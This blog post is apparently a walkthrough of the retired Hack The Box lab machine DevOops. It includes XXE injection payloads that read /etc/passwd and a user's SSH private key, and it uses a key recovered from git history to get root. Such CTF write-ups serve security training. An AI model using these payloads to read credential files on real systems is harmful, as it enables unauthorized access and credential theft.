---
layout: post
title: "Hack The Box: DevOops Walkthrough"
excerpt: "DevOops is a retired Linux machine of medium difficulty on Hack The Box"
---
# Metadata
## TCP 5000 Gunicorn Python WSGI HTTP Server
- Port `5000` is running a `Gunicorn Python WSGI HTTP Server` with version `19.7.1` which does not have serious vulnerability. ![Metadata1]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata1.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- The Home Page at `http://10.10.10.91:5000/` shows that the site is under construction and the is potentially related to `RSS feed` which involves `XML`.![Metadata2]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata2.png){:style="display:block; margin-left:auto; margin-right:auto"}
- Running directory brute forcing with `feroxbuster -u http://10.10.10.91:5000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt  -x "txt,html,php,asp,aspx,jsp" -t 10 -k -e -r` will identify an interesting URL `http://10.10.10.91:5000/upload`.![Metadata3]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata3.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- Navigate to `http://10.10.10.91:5000/upload`. It looks like we can upload a file. Try uploading a `.txt` file but the website redirects me back to the upload page. Looking at the page content, the backend might be expecting an `.xml` file with XML elements `Author`, `Subject`, `Content`. ![Metadata4]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata4.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- Try to upload the following `xml` file, the website returned something different.
		```XML
		<?xml version="1.0" encoding="UTF-8"?>
		<whatever>
		  <Author>1</Author>
		  <Subject>2</Subject>
		  <Content>3</Content>
		</whatever>
		```
	 ![Metadata5]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata5.png){:style="display:block; margin-left:auto; margin-right:auto"}
		 - From the response one can identify that:
			 - 1. backend is actually processing my `xml` file.
			 - 2. Uploaded file is at URL `/uploads/example.xml`.
			 - 3. There is a user called `roosa`.
	- Try [XML external entity (XXE) injection](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) with the following payload:
		```XML
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
		<whatever>
		  <Author>&example;</Author>
		  <Subject>2</Subject>
		  <Content>3</Content>
		</whatever>
		```
		![Metadata6]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata6.png){:style="display:block; margin-left:auto; margin-right:auto"}
		- From the response, one can conclude the backend is vulnerable to `XXE injection` and disclosed the content of `/etc/passwd` file.

## Enumeration as roosa
- Enumerate  with `linPEAS` as `roosa` will reveal there is a `.git folder` at `/home/roosa/work/blogfeed/`![Metadata7]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata7.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- Navigate to `/home/roosa/work/blogfeed/`, running `git log --name-only` will identify a suspicious commit saying `reverted accidental commit with proper key`. It looks like there is a key that is not supposed to be published.![Metadata8]({{ '/' | relative_url }}public/screenshots/DevOops/Metadata8.png){:style="display:block; margin-left:auto; margin-right:auto"}

# Exploitation
## Shell as roosa
- Using the following payload to check if user `roosa` can login through `SSH` with public-key authentication.
	```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY example SYSTEM "/home/roosa/.ssh/authorized_keys"> ]>
	<whatever>
	  <Author>&example;</Author>
	  <Subject>2</Subject>
	  <Content>3</Content>
	</whatever>
	```
	![Exploitation1]({{ '/' | relative_url }}public/screenshots/DevOops/Exploitation1.png){:style="display:block; margin-left:auto; margin-right:auto"}
- Looking at the response, there is an public key present. Use following payload to retrieve private key if it is under the same folder.
	```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY example SYSTEM "/home/roosa/.ssh/id_rsa"> ]>
	<whatever>
	  <Author>&example;</Author>
	  <Subject>2</Subject>
	  <Content>3</Content>
	</whatever>
	```
	![Exploitation2]({{ '/' | relative_url }}public/screenshots/DevOops/Exploitation2.png){:style="display:block; margin-left:auto; margin-right:auto"}
- Copy/Paste the private key into `roosa_id_rsa` with correct format and  run `ssh roosa@10.10.10.91 -i roosa_id_rsa` to get a SSH session. Remember to run `chmod 700 roosa_id_rsa` before using the private key.![Exploitation3]({{ '/' | relative_url }}public/screenshots/DevOops/Exploitation3.png){:style="display:block; margin-left:auto; margin-right:auto"}
# PrivEsc
- Run `git checkout d387abf63e05c9628a59195cec9311751bdb283f -- resources/integration/authcredentials.key` to recover the `.key` file within the commit. After recover, it is a `RSA private key`.
- Run `chmod 700 ~/work/blogfeed/resources/integration/authcredentials.key` and `ssh root@127.0.0.1 -i ~/work/blogfeed/resources/integration/authcredentials.key` to obtain a SSH session as root.

#  Beyond Root
-  Looking at `feed.py` at `~/deploy/src`. The reason for the redirect after submitting `.txt` file is because the only acceptable file extension for the `/upload` API is `.xml`. If the `allowed_file` function check fails, it would return `upload.html` and the only allowed extension is `.xml`.![Beyond-Root1]({{ '/' | relative_url }}public/screenshots/DevOops/Beyond-Root1.png){:style="display:block; margin-left:auto; margin-right:auto"}![Beyond-Root2]({{ '/' | relative_url }}public/screenshots/DevOops/Beyond-Root2.png){:style="display:block; margin-left:auto; margin-right:auto"}